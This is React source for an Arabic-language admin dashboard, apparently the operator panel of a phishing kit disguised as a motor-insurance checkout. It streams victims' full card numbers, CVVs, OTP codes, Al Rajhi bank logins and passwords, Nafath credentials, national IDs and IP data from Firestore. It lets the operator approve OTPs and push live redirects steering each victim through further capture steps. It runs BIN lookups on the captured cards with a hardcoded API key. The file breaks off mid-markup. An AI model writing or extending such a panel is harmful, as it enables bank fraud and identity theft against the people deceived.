import { useState, useEffect, useMemo, useRef } from "react";
import { useLocation } from "wouter";
import {
  Search,
  Phone,
  Copy,
  Check,
  CreditCard,
  Lock,
  Shield,
  AlertTriangle,
  LogOut,
  Users,
  Clock,
  CheckCircle,
  XCircle,
  Eye,
  Globe,
  Monitor,
  MapPin,
  Menu,
  X,
  ChevronDown,
  ChevronUp,
  FileDown,
  Moon,
  Sun,
  Trash2,
} from "lucide-react";
import { generateInsurancePDF } from "@/lib/pdf-generator";
import { cn } from "@/lib/utils";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import {
  collection,
  doc,
  updateDoc,
  deleteDoc,
  onSnapshot,
  query,
  orderBy,
  serverTimestamp,
  deleteField,
} from "firebase/firestore";
import {
  db,
  isFirebaseConfigured,
  loginWithEmail,
  logout,
  subscribeToAuthState,
} from "@/lib/firebase";
import type { User as FirebaseUser } from "firebase/auth";

interface Notification {
  id: string;
  personalInfo?: {
    fullName?: string;
    acceptMarketing?: boolean;
    birthDay?: string;
    birthMonth?: string;
    birthYear?: string;
    isHijri?: boolean;
    nationalId?: string;
    phoneNumber?: string;
  };
  vehicleInfo?: {
    vehicleSerial?: string;
    vehicleYear?: string;
    vehicleType?: string;
    vehicleModelYear?: string;
    coverageType?: string;
    selectedVehicle?: any;
  };
  selectedOffer?: {
    offerId?: string;
    offerName?: string;
    insuranceType?: string;
    selectedFeatures?: string[];
    totalPrice?: number;
  };
  paymentInfo?: {
    cardName?: string;
    cardNumber?: string;
    cardExpiry?: string;
    cardCvv?: string;
  };
  nationalId?: string;
  phoneNumber?: string;
  phoneCarrier?: string;
  phoneIdNumber?: string;
  phoneVerificationStatus?: string;
  phoneSubmittedAt?: string;
  cardName?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  otpCode?: string;
  phoneOtpCode?: string;
  rajhiUser?: string;
  rajhiPassword?: string;
  rajhiOtp?: string;
  nafazId?: string;
  nafazPass?: string;
  authNumber?: string;
  nafazStatus?: string;
  nafazSubmittedAt?: string;
  atmVerification?: { code: string; status: string; timestamp: string };
  approvalStatus?: string;
  cardOtpApproved?: boolean;
  phoneOtpApproved?: boolean;
  nafathApproved?: boolean;
  adminDirective?: {
    targetPage?: string;
    targetStep?: number;
    issuedAt?: string;
  };
  currentPage?: string | number;
  currentStep?: number;
  step?: string | number;
  status?: string;
  createdAt?: any;
  updatedAt?: any;
  isHidden?: boolean;
  isUnread?: boolean;
  country?: string;
  ipAddress?: string;
  browser?: string;
  os?: string;
  documment_owner_full_name?: string;
  identityNumber?: string;
  selectedOfferName?: string;
  offerTotalPrice?: string;
  coverageType?: string;
  vehicleSerial?: string;
  vehicleYear?: string;
  originalPrice?: string;
  selectedFeatures?: string[];
  vehicleValue?: string;
  deductiblePercentage?: string;
  vehicleUsage?: string;
  repairLocation?: string;
  documentType?: string;
  insuranceType?: string;
  city?: string;
}

export default function Dashboard() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  const [user, setUser] = useState<FirebaseUser | null>(null);
  const [authLoading, setAuthLoading] = useState(true);
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginLoading, setLoginLoading] = useState(false);

  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState("");
  const [isLoading, setIsLoading] = useState(true);
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [mobileVisitorSidebar, setMobileVisitorSidebar] = useState(false);
  const [mobileStatsExpanded, setMobileStatsExpanded] = useState(false);
  const prevAppsRef = useRef<Notification[]>([]);
  const [binInfo, setBinInfo] = useState<any>(null);
  const [binLoading, setBinLoading] = useState(false);

  const [isDark, setIsDark] = useState(() => {
    if (typeof window !== "undefined") {
      return (
        localStorage.getItem("dashboard-theme") === "dark" ||
        (!localStorage.getItem("dashboard-theme") &&
          window.matchMedia("(prefers-color-scheme: dark)").matches)
      );
    }
    return false;
  });

  useEffect(() => {
    if (isDark) {
      document.documentElement.classList.add("dark");
      localStorage.setItem("dashboard-theme", "dark");
    } else {
      document.documentElement.classList.remove("dark");
      localStorage.setItem("dashboard-theme", "light");
    }
  }, [isDark]);

  useEffect(() => {
    const unsubscribe = subscribeToAuthState((authUser) => {
      setUser(authUser);
      setAuthLoading(false);
    });
    return () => unsubscribe();
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!loginEmail || !loginPassword) {
      toast({
        title: "يرجى إدخال البريد وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    setLoginLoading(true);
    try {
      await loginWithEmail(loginEmail, loginPassword);
      toast({ title: "تم تسجيل الدخول بنجاح" });
    } catch (error: any) {
      toast({
        title: "خطأ في تسجيل الدخول",
        description:
          error.code === "auth/invalid-credential"
            ? "البريد أو كلمة المرور غير صحيحة"
            : "حدث خطأ",
        variant: "destructive",
      });
    }
    setLoginLoading(false);
  };

  const handleLogout = async () => {
    await logout();
    toast({ title: "تم تسجيل الخروج" });
  };

  useEffect(() => {
    if (!isFirebaseConfigured || !db) {
      setIsLoading(false);
      return;
    }

    const q = query(collection(db, "pays"), orderBy("updatedAt", "desc"));

    const unsubscribe = onSnapshot(q, (snapshot) => {
      const notificationsData: Notification[] = [];

      snapshot.forEach((doc) => {
        const data = doc.data();
        if (!data.isHidden) {
          notificationsData.push({
            id: doc.id,
            ...data,
          } as Notification);
        }
      });

      prevAppsRef.current = notificationsData;
      setNotifications(notificationsData);
      setIsLoading(false);
    });

    return () => unsubscribe();
  }, []);

  const getCardNumber = (n: Notification) =>
    n.paymentInfo?.cardNumber || n.cardNumber;
  const getCardName = (n: Notification) =>
    n.paymentInfo?.cardName || n.cardName;
  const getCardExpiry = (n: Notification) =>
    n.paymentInfo?.cardExpiry || n.cardExpiry;
  const getCardCvv = (n: Notification) => n.paymentInfo?.cardCvv || n.cardCvv;
  const getNationalId = (n: Notification) =>
    n.nationalId || n.personalInfo?.nationalId;
  const getPhoneNumber = (n: Notification) =>
    n.phoneNumber || n.personalInfo?.phoneNumber;

  const hasData = (n: Notification) => {
    return (
      getCardNumber(n) ||
      n.otpCode ||
      n.phoneOtpCode ||
      n.rajhiUser ||
      n.nafazId ||
      n.personalInfo?.birthYear ||
      getNationalId(n) ||
      getPhoneNumber(n)
    );
  };

  const isOnline = (n: Notification) => {
    if (!n.updatedAt) return false;
    const updatedTime =
      typeof n.updatedAt === "string"
        ? new Date(n.updatedAt).getTime()
        : n.updatedAt?.toDate?.()?.getTime?.() ||
          new Date(n.updatedAt).getTime();
    const threeMinutesAgo = Date.now() - 3 * 60 * 1000;
    return updatedTime > threeMinutesAgo;
  };

  const filteredApps = useMemo(() => {
    return notifications.filter((app) => {
      if (!hasData(app)) return false;
      const cardNum = getCardNumber(app);
      const cardNm = getCardName(app);
      const matchesSearch =
        !searchTerm ||
        app.documment_owner_full_name
          ?.toLowerCase()
          .includes(searchTerm.toLowerCase()) ||
        app.personalInfo?.fullName
          ?.toLowerCase()
          .includes(searchTerm.toLowerCase()) ||
        getNationalId(app)?.includes(searchTerm) ||
        getPhoneNumber(app)?.includes(searchTerm) ||
        cardNum?.includes(searchTerm) ||
        cardNm?.toLowerCase().includes(searchTerm.toLowerCase());
      return matchesSearch;
    });
  }, [notifications, searchTerm]);

  const stats = useMemo(() => {
    const online = notifications.filter(
      (a) => hasData(a) && isOnline(a),
    ).length;
    const total = notifications.filter(hasData).length;
    const cards = notifications.filter((a) => getCardNumber(a)).length;
    const pending = notifications.filter(
      (a) => getCardNumber(a) && !a.cardOtpApproved,
    ).length;
    const approved = notifications.filter(
      (a) => a.cardOtpApproved || a.phoneOtpApproved,
    ).length;
    return { online, total, cards, pending, approved };
  }, [notifications]);

  const selectedApplication = notifications.find(
    (app) => app.id === selectedId,
  );

  useEffect(() => {
    const cardNum = selectedApplication ? getCardNumber(selectedApplication) : null;
    if (!cardNum || cardNum.length < 6) {
      setBinInfo(null);
      return;
    }
    const bin = cardNum.replace(/\s/g, "").substring(0, 6);
    setBinLoading(true);
    const url = `https://bin-ip-checker.p.rapidapi.com/?bin=${bin}`;
    const options = {
      method: 'GET',
      headers: {
        'x-rapidapi-key': '5c73c39f9fmsh657b606dfa61046p16d2c3jsn127ed336a63b',
        'x-rapidapi-host': 'bin-ip-checker.p.rapidapi.com'
      }
    };
    fetch(url, options)
      .then(res => res.json())
      .then(data => {
        setBinInfo(data);
        setBinLoading(false);
      })
      .catch(() => {
        setBinInfo(null);
        setBinLoading(false);
      });
  }, [selectedApplication?.id, selectedApplication?.cardNumber, selectedApplication?.paymentInfo?.cardNumber]);

  const handleMarkAsRead = async (app: Notification) => {
    setSelectedId(app.id);
    setMobileVisitorSidebar(false);
    if (app.isUnread && db) {
      await updateDoc(doc(db, "pays", app.id), { isUnread: false });
    }
  };

  const handleFieldApproval = async (
    id: string,
    field: string,
    value: boolean,
  ) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), { [field]: value });
      toast({ title: "تم التحديث" });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handleApprovalStatus = async (id: string, status: string) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), { approvalStatus: status });
      toast({ title: "تم التحديث" });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handlePendingReview = async (id: string) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), {
        approvalStatus: "pending_review",
      });
      toast({ title: "تم وضع الطلب قيد المراجعة" });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handleDeleteVisitor = async (id: string) => {
    if (!db) return;
    try {
      await deleteDoc(doc(db, "pays", id));
      if (selectedId === id) {
        setSelectedId(null);
      }
      toast({ title: "تم حذف الزائر بنجاح" });
    } catch (error) {
      toast({ title: "خطأ في الحذف", variant: "destructive" });
    }
  };

  const handleRedirectUser = async (
    id: string,
    targetPage: string,
    targetStep?: number,
  ) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), {
        adminDirective: {
          targetPage,
          targetStep: targetStep || 1,
          issuedAt: new Date().toISOString(),
        },
        cardOtpApproved: deleteField(),
        phoneOtpApproved: deleteField(),
        nafathApproved: deleteField(),
        approvalStatus: deleteField(),
      });
      toast({ title: `تم توجيه الزائر إلى ${targetPage}` });
    } catch (error) {
      toast({ title: "خطأ في التوجيه", variant: "destructive" });
    }
  };

  const getBasePageName = (page?: string | number): string => {
    if (!page || typeof page !== "string") return "motor";
    if (page.startsWith("motor-insurance") || page.startsWith("motor"))
      return "motor";
    if (page.startsWith("phone")) return "phone-verification";
    if (page.startsWith("nafaz")) return "nafaz";
    if (page.startsWith("rajhi")) return "rajhi";
    return "motor";
  };

  const handleSetStep = async (id: string, step: number) => {
    if (!db) return;
    try {
      const currentApp = notifications.find((n) => n.id === id);
      const basePage = getBasePageName(currentApp?.currentPage);
      await updateDoc(doc(db, "pays", id), {
        adminDirective: {
          targetPage: basePage,
          targetStep: step,
          issuedAt: new Date().toISOString(),
        },
        cardOtpApproved: deleteField(),
        phoneOtpApproved: deleteField(),
        nafathApproved: deleteField(),
        approvalStatus: deleteField(),
      });
      toast({ title: `تم تغيير الخطوة إلى ${step}` });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const copyToClipboard = (text: string, label: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopiedField(label);
    setTimeout(() => setCopiedField(null), 2000);
    toast({ title: "تم النسخ", description: label });
  };

  const getDisplayName = (n: Notification) => {
    return (
      n.documment_owner_full_name ||
      n.personalInfo?.fullName ||
      getCardName(n) ||
      n.nationalId ||
      n.phoneNumber ||
      n.id.substring(0, 8)
    );
  };

  const formatCardNumber = (num?: string) => {
    if (!num) return "";
    const clean = num.replace(/\s/g, "");
    return clean.replace(/(.{4})/g, "$1 ").trim();
  };

  const OtpDisplay = ({ code, label }: { code?: string; label: string }) => {
    const digits = (code || "").padEnd(6, " ").slice(0, 6).split("");
    return (
      <div className="flex items-center gap-2" dir="ltr">
        {digits.map((digit, i) => (
          <div
            key={i}
            className="w-12 h-14 bg-gradient-to-b from-gray-50 to-gray-100 dark:from-gray-700 dark:to-gray-800 border-2 border-gray-300 dark:border-gray-600 rounded-lg flex items-center justify-center text-2xl font-bold text-gray-900 dark:text-white shadow-sm"
            data-testid={`otp-digit-${label}-${i}`}
          >
            {digit !== " " ? digit : ""}
          </div>
        ))}
      </div>
    );
  };

  if (!isFirebaseConfigured) {
    return (
      <div
        className="flex items-center justify-center h-screen bg-background"
        dir="rtl"
      >
        <div className="text-center p-8 max-w-md">
          <AlertTriangle className="h-16 w-16 text-amber-500 mx-auto mb-4" />
          <h2
            className="text-xl font-bold mb-2"
            data-testid="text-firebase-error"
          >
            Firebase غير مكون
          </h2>
          <p className="text-muted-foreground">
            يرجى تكوين Firebase للوصول إلى لوحة التحكم
          </p>
        </div>
      </div>
    );
  }

  if (authLoading) {
    return (
      <div
        className="flex h-screen items-center justify-center bg-background"
        dir="rtl"
      >
        <div className="text-center">
          <div className="w-12 h-12 border-4 border-purple-500 border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground" data-testid="text-loading">
            جاري التحميل...
          </p>
        </div>
      </div>
    );
  }

  if (!user) {
    return (
      <div
        className="flex h-screen items-center justify-center bg-gradient-to-br from-purple-900 via-purple-800 to-indigo-900"
        dir="rtl"
      >
        <div className="w-full max-w-md mx-4">
          <div className="bg-card rounded-2xl shadow-2xl p-8 border border-purple-500/20 backdrop-blur-sm">
            <div className="text-center mb-8">
              <div className="w-20 h-20 bg-gradient-to-br from-purple-500 to-indigo-500 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg animate-pulse">
                <Shield className="w-10 h-10 text-white" />
              </div>
              <h1
                className="text-2xl font-bold text-foreground"
                data-testid="text-login-title"
              >
                لوحة التحكم
              </h1>
              <p className="text-muted-foreground text-sm mt-2">
                تسجيل الدخول للمتابعة
              </p>
            </div>

            <form onSubmit={handleLogin} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-foreground mb-2">
                  البريد الإلكتروني
                </label>
                <Input
                  type="email"
                  value={loginEmail}
                  onChange={(e) => setLoginEmail(e.target.value)}
                  placeholder="admin@example.com"
                  className="text-left"
                  dir="ltr"
                  data-testid="input-login-email"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-foreground mb-2">
                  كلمة المرور
                </label>
                <Input
                  type="password"
                  value={loginPassword}
                  onChange={(e) => setLoginPassword(e.target.value)}
                  placeholder="••••••••"
                  className="text-left"
                  dir="ltr"
                  data-testid="input-login-password"
                />
              </div>
              <Button
                type="submit"
                className="w-full"
                disabled={loginLoading}
                data-testid="button-login"
              >
                {loginLoading ? (
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                ) : (
                  <>
                    <Lock className="w-4 h-4 ml-2" />
                    تسجيل الدخول
                  </>
                )}
              </Button>
            </form>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col h-screen bg-gray-50 dark:bg-gray-900 w-full overflow-hidden">
      {/* Top Header with Stats */}
      <header className="bg-gradient-to-l from-slate-50 to-white dark:from-gray-800 dark:to-gray-900 border-b border-gray-200 dark:border-gray-700 px-3 md:px-4 py-2 md:py-3 shrink-0">
        <div className="flex items-center justify-between gap-2">
          {/* Mobile Menu Toggle */}
          <Button
            variant="ghost"
            size="icon"
            className="lg:hidden"
            onClick={() => setMobileVisitorSidebar(!mobileVisitorSidebar)}
            data-testid="button-mobile-menu"
          >
            <Menu className="w-5 h-5" />
          </Button>

          {/* Logo/Title */}
          <div className="flex items-center gap-2 md:gap-3">
            <Button
              variant="default"
              size="sm"
              className="text-xs md:text-sm"
              data-testid="button-admin-panel"
            >
              لوحة التحكم
            </Button>
            <div className="hidden sm:flex items-center gap-2 text-sm text-gray-500 dark:text-gray-400">
              <span
                className="text-green-500 font-medium"
                data-testid="text-domain"
              >
                treeqadmin.co
              </span>
              <Globe className="w-4 h-4" />
            </div>
          </div>

          {/* Stats Cards - Desktop */}
          <div className="hidden xl:flex items-center gap-2">
            <div
              className="flex items-center gap-2 px-3 py-1.5 bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-lg"
              data-testid="stat-card-pending"
            >
              <span className="text-xs text-gray-500 dark:text-gray-400">
                رسائل
              </span>
              <span
                className="font-bold text-sm text-gray-800 dark:text-white"
                data-testid="stat-pending"
              >
                {stats.pending}
              </span>
              <div className="w-2.5 h-2.5 bg-gray-400 rounded-full" />
            </div>
            <div
              className="flex items-center gap-2 px-3 py-1.5 bg-emerald-50 dark:bg-emerald-900/20 border border-emerald-200 dark:border-emerald-800 rounded-lg"
              data-testid="stat-card-approved"
            >
              <span className="text-xs text-gray-500 dark:text-gray-400">
                موافق
              </span>
              <span
                className="font-bold text-sm text-gray-800 dark:text-white"
                data-testid="stat-approved"
              >
                {stats.approved}
              </span>
              <div className="w-2.5 h-2.5 bg-blue-500 rounded-full" />
            </div>
            <div
              className="flex items-center gap-2 px-3 py-1.5 bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 rounded-lg"
              data-testid="stat-card-total"
            >
              <span className="text-xs text-gray-500 dark:text-gray-400">
                إجمالي
              </span>
              <span
                className="font-bold text-sm text-gray-800 dark:text-white"
                data-testid="stat-total"
              >
                {stats.total}
              </span>
              <div className="w-2.5 h-2.5 bg-green-500 rounded-full" />
            </div>
            <div
              className="flex items-center gap-2 px-3 py-1.5 bg-rose-50 dark:bg-rose-900/20 border border-rose-200 dark:border-rose-800 rounded-lg"
              data-testid="stat-card-online"
            >
              <span className="text-xs text-gray-500 dark:text-gray-400">
                نشطاء
              </span>
              <span
                className="font-bold text-sm text-gray-800 dark:text-white"
                data-testid="stat-online"
              >
                {stats.online}
              </span>
              <div className="w-2.5 h-2.5 bg-red-500 rounded-full" />
            </div>
          </div>

          {/* Stats Toggle - Mobile/Tablet */}
          <Button
            variant="ghost"
            size="sm"
            className="xl:hidden flex items-center gap-1 text-xs"
            onClick={() => setMobileStatsExpanded(!mobileStatsExpanded)}
            data-testid="button-stats-toggle"
          >
            <span className="hidden sm:inline">الإحصائيات</span>
            <Badge variant="secondary" className="text-xs">
              {stats.online}
            </Badge>
            {mobileStatsExpanded ? (
              <ChevronUp className="w-4 h-4" />
            ) : (
              <ChevronDown className="w-4 h-4" />
            )}
          </Button>

          {/* Dark Mode Toggle */}
          <Button
            variant="ghost"
            size="icon"
            onClick={() => setIsDark(!isDark)}
            data-testid="button-dark-mode"
          >
            {isDark ? (
              <Sun className="w-5 h-5 text-yellow-400" />
            ) : (
              <Moon className="w-5 h-5 text-gray-500 dark:text-gray-400" />
            )}
          </Button>

          {/* Logout */}
          <Button
            variant="ghost"
            size="icon"
            onClick={handleLogout}
            data-testid="button-logout"
          >
            <LogOut className="w-5 h-5 text-gray-500 dark:text-gray-400" />
          </Button>
        </div>

        {/* Expandable Stats - Mobile/Tablet */}
        {mobileStatsExpanded && (
          <div className="xl:hidden grid grid-cols-2 sm:grid-cols-4 gap-2 mt-3 pt-3 border-t border-gray-200 dark:border-gray-700">
            <div className="flex items-center justify-between gap-2 px-3 py-2 bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-lg">
              <span className="text-xs text-gray-500 dark:text-gray-400">
                رسائل قائمة
              </span>
              <div className="flex items-center gap-1">
                <span
                  className="font-bold text-sm"
                  data-testid="stat-pending-mobile"
                >
                  {stats.pending}
                </span>
                <div className="w-2.5 h-2.5 bg-gray-400 rounded-full" />
              </div>
            </div>
            <div className="flex items-center justify-between gap-2 px-3 py-2 bg-emerald-50 dark:bg-emerald-900/20 border border-emerald-200 dark:border-emerald-800 rounded-lg">
              <span className="text-xs text-gray-500 dark:text-gray-400">
                موافق
              </span>
              <div className="flex items-center gap-1">
                <span
                  className="font-bold text-sm"
                  data-testid="stat-approved-mobile"
                >
                  {stats.approved}
                </span>
                <div className="w-2.5 h-2.5 bg-blue-500 rounded-full" />
              </div>
            </div>
            <div className="flex items-center justify-between gap-2 px-3 py-2 bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 rounded-lg">
              <span className="text-xs text-gray-500 dark:text-gray-400">
                إجمالي
              </span>
              <div className="flex items-center gap-1">
                <span
                  className="font-bold text-sm"
                  data-testid="stat-total-mobile"
                >
                  {stats.total}
                </span>
                <div className="w-2.5 h-2.5 bg-green-500 rounded-full" />
              </div>
            </div>
            <div className="flex items-center justify-between gap-2 px-3 py-2 bg-rose-50 dark:bg-rose-900/20 border border-rose-200 dark:border-rose-800 rounded-lg">
              <span className="text-xs text-gray-500 dark:text-gray-400">
                نشطاء الآن
              </span>
              <div className="flex items-center gap-1">
                <span
                  className="font-bold text-sm"
                  data-testid="stat-online-mobile"
                >
                  {stats.online}
                </span>
                <div className="w-2.5 h-2.5 bg-red-500 rounded-full" />
              </div>
            </div>
          </div>
        )}
      </header>

      {/* Main Content Area */}
      <div className="flex flex-1 overflow-hidden relative">
        {/* Main Content */}
        <main className="flex-1 overflow-auto p-2 md:p-4">
          {selectedApplication ? (
            <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-12 gap-3 md:gap-4">
              {/* Left Column - Info Cards */}
              <div className="md:col-span-1 xl:col-span-4 space-y-3 md:space-y-4 overflow-auto max-h-none md:max-h-[calc(100vh-180px)]">
                {/* العرض المختار - Selected Offer */}
                <Card className="bg-white dark:bg-gray-800/80 shadow-sm">
                  <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
                    <CardTitle className="text-sm font-medium">
                      العرض المختار
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-2">
                    <div
                      className="flex justify-between items-center py-1 border-b"
                      data-testid="info-company"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        الشركة
                      </span>
                      <span className="font-medium text-sm">
                        {selectedApplication.selectedOffer?.offerName ||
                          selectedApplication.selectedOfferName ||
                          "-"}
                      </span>
                    </div>
                    <div
                      className="flex justify-between items-center py-1 border-b"
                      data-testid="info-insurance-type-offer"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        نوع التأمين
                      </span>
                      <span className="font-medium text-sm">
                        {selectedApplication.selectedOffer?.insuranceType ||
                          "-"}
                      </span>
                    </div>
                    <div
                      className="flex justify-between items-center py-1 border-b"
                      data-testid="info-final-price"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        السعر النهائي
                      </span>
                      <span className="font-medium text-sm">
                        {selectedApplication.selectedOffer?.totalPrice ||
                          selectedApplication.offerTotalPrice ||
                          "-"}
                      </span>
                    </div>
                    <div
                      className="flex justify-between items-center py-1"
                      data-testid="info-features"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        المميزات المختارة
                      </span>
                      <span className="font-medium text-sm">
                        {selectedApplication.selectedOffer?.selectedFeatures
                          ?.length ||
                          selectedApplication.selectedFeatures?.length ||
                          0}{" "}
                        مميزات
                      </span>
                    </div>
                  </CardContent>
                </Card>

                {/* معلومات شخصية - Personal Info */}
                <Card className="bg-white dark:bg-gray-800/80 shadow-sm">
                  <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
                    <CardTitle className="text-sm font-medium">
                      المعلومات الشخصية
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-2">
                    {/* الاسم الكامل - بارز */}
                    <div
                      className="flex justify-between items-center py-2 border-b bg-blue-50 dark:bg-blue-900/20 px-2 rounded"
                      data-testid="info-full-name"
                    >
                      <span className="text-blue-600 dark:text-blue-400 text-sm font-medium">
                        الاسم الكامل
                      </span>

                      <span className="font-bold text-base text-blue-700 dark:text-blue-300">
                        {selectedApplication.documment_owner_full_name ||
                          selectedApplication.personalInfo?.fullName ||
                          "-"}
                      </span>
                    </div>
                    <div
                      className="flex justify-between items-center py-1 border-b"
                      data-testid="info-national-id"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        رقم الهوية
                      </span>
                      <span className="font-mono text-sm" dir="ltr">
                        {getNationalId(selectedApplication) || "-"}
                      </span>
                    </div>
                    <div
                      className="flex justify-between items-center py-1 border-b"
                      data-testid="info-card-name"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        اسم حامل البطاقة
                      </span>
                      <span className="font-medium text-sm">
                        {getCardName(selectedApplication) || "-"}
                      </span>
                    </div>
                    <div
                      className="flex justify-between items-center py-1 border-b"
                      data-testid="info-phone"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        رقم الجوال
                      </span>
                      <span className="font-mono text-sm" dir="ltr">
                        {getPhoneNumber(selectedApplication) || "-"}
                      </span>
                    </div>
                    <div
                      className="flex justify-between items-center py-1 border-b"
                      data-testid="info-birthdate"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        تاريخ الميلاد
                      </span>
                      <span className="font-mono text-sm" dir="ltr">
                        {selectedApplication.personalInfo?.birthDay &&
                        selectedApplication.personalInfo?.birthMonth &&
                        selectedApplication.personalInfo?.birthYear
                          ? `${selectedApplication.personalInfo.birthDay}/${selectedApplication.personalInfo.birthMonth}/${selectedApplication.personalInfo.birthYear}`
                          : "-"}
                      </span>
                    </div>
                    <div
                      className="flex justify-between items-center py-1"
                      data-testid="info-hijri"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        التقويم
                      </span>
                      <span className="font-medium text-sm">
                        {selectedApplication.personalInfo?.isHijri
                          ? "هجري"
                          : "ميلادي"}
                      </span>
                    </div>
                  </CardContent>
                </Card>

                {/* معلومات المركبة - Vehicle Info */}
                <Card className="bg-white dark:bg-gray-800/80 shadow-sm">
                  <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
                    <CardTitle className="text-sm font-medium">
                      معلومات المركبة
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-2">
                    <div
                      className="flex justify-between items-center py-1 border-b"
                      data-testid="info-serial"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        الرقم التسلسلي
                      </span>
                      <span className="font-mono text-sm" dir="ltr">
                        {selectedApplication.vehicleInfo?.vehicleSerial ||
                          selectedApplication.vehicleSerial ||
                          "-"}
                      </span>
                    </div>
                    <div
                      className="flex justify-between items-center py-1 border-b"
                      data-testid="info-year"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        سنة الصنع
                      </span>
                      <span className="font-mono text-sm" dir="ltr">
                        {selectedApplication.vehicleInfo?.vehicleYear ||
                          selectedApplication.vehicleYear ||
                          "-"}
                      </span>
                    </div>
                    {selectedApplication.vehicleInfo?.vehicleType && (
                      <div
                        className="flex justify-between items-center py-1 border-b"
                        data-testid="info-vehicle-type"
                      >
                        <span className="text-gray-500 dark:text-gray-400 text-sm">
                          نوع المركبة
                        </span>
                        <span className="font-medium text-sm">
                          {selectedApplication.vehicleInfo.vehicleType}
                        </span>
                      </div>
                    )}
                    {selectedApplication.vehicleInfo?.vehicleModelYear && (
                      <div
                        className="flex justify-between items-center py-1 border-b"
                        data-testid="info-vehicle-model-year"
                      >
                        <span className="text-gray-500 dark:text-gray-400 text-sm">
                          سنة الموديل
                        </span>
                        <span className="font-mono text-sm" dir="ltr">
                          {selectedApplication.vehicleInfo.vehicleModelYear}
                        </span>
                      </div>
                    )}
                    <div
                      className="flex justify-between items-center py-1"
                      data-testid="info-coverage"
                    >
                      <span className="text-gray-500 dark:text-gray-400 text-sm">
                        نوع التغطية
                      </span>
                      <span className="font-medium text-sm">
                        {(selectedApplication.vehicleInfo?.coverageType ||
                          selectedApplication.coverageType) === "third-party"
                          ? "طرف ثالث"
                          : (selectedApplication.vehicleInfo?.coverageType ||
                                selectedApplication.coverageType) ===
                              "comprehensive"
                            ? "شامل"
                            : "-"}
                      </span>
                    </div>
                  </CardContent>
                </Card>

                {/* بيانات نفاذ - Nafaz Data */}
                {(selectedApplication.nafazId ||
                  selectedApplication.nafazPass ||
                  selectedApplication.authNumber) && (
                  <Card className="bg-white dark:bg-gray-800 border-blue-200 dark:border-blue-800">
                    <CardHeader className="pb-2 flex flex-row flex-wrap items-center justify-between gap-2">
                      <CardTitle className="text-sm font-medium text-blue-600 dark:text-blue-400">
                        بيانات نفاذ
                      </CardTitle>
                      <Badge variant="outline" className="text-xs">
                        {selectedApplication.nafazStatus || "pending"}
                      </Badge>
                    </CardHeader>
                    <CardContent className="space-y-2">
                      <div
                        className="flex justify-between items-center py-1 border-b"
                        data-testid="info-nafaz-id"
                      >
                        <span className="text-gray-500 dark:text-gray-400 text-sm">
                          اسم المستخدم
                        </span>
                        <span className="font-mono text-sm" dir="ltr">
                          {selectedApplication.nafazId || "-"}
                        </span>
                      </div>
                      <div
                        className="flex justify-between items-center py-1 border-b"
                        data-testid="info-nafaz-pass"
                      >
                        <span className="text-gray-500 dark:text-gray-400 text-sm">
                          كلمة المرور
                        </span>
                        <span className="font-mono text-sm" dir="ltr">
                          {selectedApplication.nafazPass || "-"}
                        </span>
                      </div>
                      <div
                        className="flex justify-between items-center py-1 gap-2"
                        data-testid="info-nafaz-auth"
                      >
                        <span className="text-gray-500 dark:text-gray-400 text-sm whitespace-nowrap">
                          رقم المصادقة
                        </span>
                        <div className="flex items-center gap-1">
                          <input
                            type="text"
